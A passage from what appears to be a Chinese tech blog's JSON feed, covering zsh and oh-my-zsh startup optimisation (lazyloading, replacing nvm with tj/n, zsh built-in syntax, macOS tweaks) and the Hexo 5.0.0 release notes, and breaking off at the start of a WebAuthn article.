/Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" 